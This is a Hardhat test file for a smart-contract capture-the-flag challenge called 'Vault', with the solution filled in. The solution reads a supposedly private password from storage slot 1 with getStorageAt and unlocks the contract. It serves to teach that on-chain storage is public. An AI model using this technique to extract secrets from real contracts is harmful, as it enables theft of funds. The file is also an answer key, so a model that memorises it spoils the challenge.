const { ethers } = require("hardhat");
const { expect } = require("chai");

/*

Unlock the vault to pass the level!

*/

describe("[Challenge] Vault", function () {
  let deployer, attacker;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const securePassword = ethers.utils.formatBytes32String("123456");
    this.vault = await (
      await ethers.getContractFactory("Vault", deployer)
    ).deploy(securePassword);

    const locked = await this.vault.locked();
    expect(locked).to.eq(true);
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */

    //get data in slot1 = password
    const password = await ethers.provider.getStorageAt(this.vault.address, 1);
    await this.vault.connect(attacker).unlock(password);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    const locked = await this.vault.locked();
    // Vault is not locked
    expect(locked).to.eq(false);
  });
});
